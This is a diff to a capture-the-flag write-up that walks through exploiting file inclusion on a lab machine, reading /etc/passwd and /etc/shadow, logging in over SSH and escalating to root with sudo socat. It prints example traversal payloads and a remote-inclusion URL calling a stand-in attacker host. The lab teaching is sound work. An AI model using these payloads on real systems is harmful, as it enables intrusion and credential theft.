@@ -2,13 +2,17 @@
 
 ##### Written: 17/05/2021
 
-#### IP Address: 10.10.16.93
+##### IP Address: 10.10.16.93
+
+<br>
 
 First, I ran a basic nmap scan on the target machine with standard scripts loaded and version enumeration configured. The results are as follows:
 
 <img style="float: left;" src="screenshots/screenshot1.png">
 
 As we can see, there are two services running on the target machine: **ssh** and **http**. For the http server, we can see that the http-title is 'My blog'.
+
+<br>
 
 Let's first check out the http webserver. Navigating to the website in my web browser, I came to this page:
 
@@ -32,7 +36,7 @@ At the bottom of the web page, there were three sections dedicated to different 
 
 Time to learn more about LFI and RFI attacks.
 
-
+<br>
 
 #### Local File Inclusion
 
@@ -60,7 +64,7 @@ If the attacker has managed to upload a malicious file onto the webserver, let's
 https://example.com/?module=../../../uploads/malicious.php
 ```
 
-
+<br>
 
 #### Remote File Inclusion
 
@@ -70,7 +74,7 @@ In essence, RFI attack vulnerabilities stem from the same root issue as LFI atta
 http://example.com/?file=http://attacker.example.com/evil.php
 ```
 
-
+<Br>
 
 Now that I had a better understanding of how LFI and RFI attacks work, I could try to execute the attack against the target machine. First, I tried to find points within the web page in which I could mount that attack. 
 
@@ -80,11 +84,15 @@ At first, I tried to use the search field to see if the web server accepted any 
 
 
 
+<br>
+
 Next, I checked whether the web server took inputs when I clicked on the **'View Details'** buttons located at the bottom of the webpage. Sure enough, they did indeed practiced file inclusion, which means that I could attempt to mount an attack there!
 
 <img style="float: left;" src="screenshots/screenshot4.png">
 
 It seemed that the web server was taking in an input **'name'** and the filename that produced the wall of text shown on the page was called **'hacking'**.
+
+<br>
 
 I'll try to change **'hacking'** to **'../../../../../etc/passwd'** to see if I can read the /etc/passwd file.
 
@@ -98,13 +106,19 @@ Sure enough, I could read the /etc/shadow file, which is great. From the file, I
 
  <img style="float: left;" src="screenshots/screenshot7.png">
 
-On the right, we can see the text **'falconfeast:rootpassword'** Could **'rootpassword'** be the password for falconfeast? To test this, I tried to ssh into falconfeast's account using the password:
+On the right, we can see the text **'falconfeast:rootpassword'** Could **'rootpassword'** be the password for falconfeast? 
+
+<br>
+
+To test this, I tried to ssh into falconfeast's account using the password:
 
 <img style="float: left;" src="screenshots/screenshot8.png">
 
 Nice, that was his password after all. 
 
-#### With that, I could obtain the user flag
+**With that, I could obtain the user.txt**
+
+<br>
 
 ---
 
@@ -120,7 +134,9 @@ to see what sudo privileges that falconfeast had.
 
 <img style="float: left;" src="screenshots/screenshot9.png">
 
-Looks like he can run **socat** as root! Next, I went to **GTFOBins** to see if there were any vulnerabilities that I could exploit with this binary.
+Looks like he can run **socat** as root. Next, I went to **GTFOBins** to see if there were any vulnerabilities that I could exploit with this binary.
+
+<br>
 
 After looking through GTFOBins, I decided to use socat to spawn a shell as root
 
@@ -130,7 +146,5 @@ After running the command above, I managed to spawn a shell as root:
 
 <img style="float: left;" src="screenshots/screenshot11.png">
 
-
-
-#### With that, I can easily navigate towards root's home directory and obtain the root.flag
+**With that, I can easily navigate towards root's home directory and obtain root.flag**
 
